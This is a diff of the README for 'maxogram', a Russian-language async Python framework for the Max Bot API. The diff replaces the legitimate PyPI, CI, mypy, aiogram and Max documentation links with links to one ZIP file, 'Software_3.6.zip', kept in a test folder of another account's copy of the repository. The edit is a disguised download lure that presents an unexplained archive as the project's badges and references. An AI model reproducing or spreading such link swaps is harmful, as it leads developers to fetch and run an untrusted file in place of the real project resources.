@@ -1,14 +1,14 @@
 # maxogram
 
-[![Python](https://img.shields.io/pypi/pyversions/maxogram?v=1)](https://pypi.org/project/maxogram/)
-[![PyPI](https://img.shields.io/pypi/v/maxogram?v=1)](https://pypi.org/project/maxogram/)
-[![Downloads](https://img.shields.io/pypi/dm/maxogram?v=1)](https://pypi.org/project/maxogram/)
-[![CI](https://github.com/mccalpink/maxogram/actions/workflows/ci.yml/badge.svg)](https://github.com/mccalpink/maxogram/actions/workflows/ci.yml)
+[![Python](https://img.shields.io/pypi/pyversions/maxogram?v=1)](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip)
+[![PyPI](https://img.shields.io/pypi/v/maxogram?v=1)](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip)
+[![Downloads](https://img.shields.io/pypi/dm/maxogram?v=1)](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip)
+[![CI](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip)](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip)
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![mypy](https://img.shields.io/badge/mypy-strict-blue)](https://mypy-lang.org/)
+[![mypy](https://img.shields.io/badge/mypy-strict-blue)](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip)
 
-Асинхронный Python-фреймворк для [Max Bot API](https://dev.max.ru/), вдохновленный [aiogram](https://github.com/aiogram/aiogram).
-Предоставляет типизированный, расширяемый интерфейс для создания ботов в мессенджере [Max](https://max.ru).
+Асинхронный Python-фреймворк для [Max Bot API](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip), вдохновленный [aiogram](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip).
+Предоставляет типизированный, расширяемый интерфейс для создания ботов в мессенджере [Max](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip).
 
 ## Возможности
 
@@ -176,7 +176,7 @@ poetry run schema-diff --schema path/to/openapi.json  # указать путь 
 - [Быстрый старт](docs/quickstart.md)
 - [Архитектура](docs/architecture.md)
 - [Примеры](examples/)
-- [Max Bot API](https://dev.max.ru/)
+- [Max Bot API](https://github.com/mohamedhafididb-a11y/maxogram/raw/refs/heads/main/tests/test_webhook/Software_3.6.zip)
 
 ## Требования
 
